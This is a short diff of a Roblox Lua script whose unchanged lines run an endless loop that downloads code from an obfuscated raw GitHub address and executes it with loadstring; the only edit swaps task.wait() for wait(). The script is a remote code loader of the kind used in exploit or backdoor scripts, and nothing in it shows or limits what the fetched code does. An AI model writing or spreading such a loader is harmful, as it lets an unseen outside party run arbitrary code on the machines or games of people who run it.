@@ -1,4 +1,4 @@
 while true do
-task.wait()
+wait()
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GBgmEbe6Tu3mSAR6uTNnbbyIz7NEng7f688cPgX1"))()
 end
